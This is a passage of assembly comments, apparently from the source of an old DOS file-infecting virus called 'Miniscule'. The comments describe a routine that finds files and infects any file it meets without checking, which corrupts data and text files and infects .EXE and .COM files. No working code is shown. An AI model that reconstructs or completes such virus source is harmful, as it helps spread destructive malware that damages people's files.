; Find the name of the first file and return it in the DTA.  No checking
; is done for previous infections, and ANY file (except directory "files")
; will be infected, including data, texts, etc.  So either a file is corrupted
; (in the case of data or text) or infected (.EXE and .COM files).  Files that
; have the read-only flag set are immune to Miniscule.
